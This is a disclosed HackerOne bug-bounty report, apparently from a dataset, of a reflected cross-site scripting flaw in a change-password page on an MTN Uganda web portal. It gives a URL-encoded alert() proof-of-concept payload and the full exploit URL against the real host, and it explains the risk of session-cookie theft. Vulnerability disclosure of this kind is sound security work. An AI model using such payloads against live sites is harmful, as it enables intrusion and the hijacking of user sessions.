---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1183336'
original_report_id: '1183336'
title: Cross-site Scripting (XSS) - Reflected
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: mtn_group
created_at: '2021-05-03T22:14:25.413Z'
disclosed_at: '2022-10-30T21:54:20.309Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 31
asset_identifier: mtn.co.ug
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Cross-site Scripting (XSS) - Reflected

## Metadata

- HackerOne Report ID: 1183336
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: mtn_group
- Disclosed At: 2022-10-30T21:54:20.309Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

hello dear support

Cross-site Scripting (XSS) refers to client-side code injection attack wherein an attacker can execute malicious scripts into a legitimate website or web application. XSS occurs when a web application makes use of unvalidated or unencoded user input within the output it generates.

i have found the issue on https://eweb01.mtn.co.ug

param and path /evds_portal_fe/change_password.htm?terminalId=

payload "%3c%3c%73%63%72%5c%61%61%61%2f%73%72%63%3d%3e%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%70%6c%61%79%73%74%61%74%69%6f%6e%20%72%65%66%6c%65%63%74%65%64%20%78%73%73%20%42%59%20%42%34%47%47%33%52%22%29%3c%2f%73%63%72%69%70%74%3e"


https://eweb01.mtn.co.ug/evds_portal_fe/change_password.htm?terminalId=%22%3c%3c%73%63%72%5c%61%61%61%2f%73%72%63%3d%3e%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%70%6c%61%79%73%74%61%74%69%6f%6e%20%72%65%66%6c%65%63%74%65%64%20%78%73%73%20%42%59%20%42%34%47%47%33%52%22%29%3c%2f%73%63%72%69%70%74%3e%22

URL encoded GET input terminalId was set to 19146"();}]9520

The input is reflected inside a <script> tag between double quotes.

## Impact

XSS
Malicious JavaScript has access to all the same objects as the rest of the web page, including access to cookies and local storage, which are often used to store session tokens. If an attacker can obtain a user's session cookie, they can then impersonate that user.

Furthermore, JavaScript can read and make arbitrary modifications to the contents of a page being displayed to a user. Therefore, XSS in conjunction with some clever social engineering opens up a lot of possibilities for an attacker.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
